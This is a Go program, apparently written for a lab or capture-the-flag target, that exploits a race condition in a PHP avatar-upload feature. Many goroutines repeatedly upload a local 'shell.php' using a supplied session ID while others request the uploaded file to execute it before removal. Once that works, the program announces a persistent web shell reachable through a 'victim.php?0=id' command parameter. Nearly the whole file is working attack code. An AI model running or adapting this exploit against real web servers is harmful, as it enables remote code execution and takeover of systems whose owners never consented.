package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path"
	"path/filepath"
)

var isSuccess bool = false

func main() {
	// usage := "./main -url "http://victim.com" -sessionID "benee8i0jfdcsvmsk5cva6gm" -numConcurency 100"
	var WEB_URL string
	var PHPSESSID string
	var numConcurency int

	// handle command arguments
	flag.StringVar(&WEB_URL, "url", "http://192.168.244.129:12010", "Destination web url")
	flag.StringVar(&PHPSESSID, "sessionID", "8lbenee8i0jfdcsvmsk5cva6gm", "The PHPSESSID value")
	flag.IntVar(&numConcurency, "numConcurency", 100, "Number of concurency that used in race condition attack")
	flag.Parse()

	fmt.Println("Running with following arguments:")
	fmt.Printf(" - WEB_URL: %s\n", WEB_URL)
	fmt.Printf(" - PHPSESSID: %s\n", PHPSESSID)
	fmt.Printf(" - numConcurency: %d\n\n", numConcurency)

	const shellName string = "shell.php"

	for i := 0; i < numConcurency; i++ {
		go PostForm(WEB_URL, PHPSESSID, shellName)
		go activateShell(WEB_URL, shellName)
	}

	for {
		if isSuccess {
			return
		}
	}

}

func activateShell(WEB_URL string, shellName string) {
	for {
		resp, err := http.Get(WEB_URL + "/avatar/" + shellName)
		if err == nil && resp.StatusCode == 200 {
			fmt.Println("\n####################")
			fmt.Printf("##  [x] Shell activated!\n##  Access the persistent shell in %s%s\n", WEB_URL, "/avatar/victim.php?0=id")
			fmt.Print("####################\n\n")
			isSuccess = true
		} else {
			fmt.Println("[ ] on racing...")
		}
	}
}

func PostForm(url string, phpSessionID string, fileName string) {
	for {
		fmt.Println("[ ] in posting paload")
		fileDir, _ := os.Getwd()
		filePath := path.Join(fileDir, fileName)

		file, _ := os.Open(filePath)
		defer file.Close()

		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		part, _ := writer.CreateFormFile("file", filepath.Base(file.Name()))
		io.Copy(part, file)
		writer.Close()

		r, _ := http.NewRequest("POST", url, body)
		r.Header.Add("Content-Type", writer.FormDataContentType())
		r.Header.Add("PHPSESSIONID", phpSessionID)
		client := &http.Client{}
		resp, err := client.Do(r)

		if err != nil {
			fmt.Println("Error: Read body error")
		}
		if resp.StatusCode == 200 {
			fmt.Println("[-] Shell uploaded")
		}
	}
}
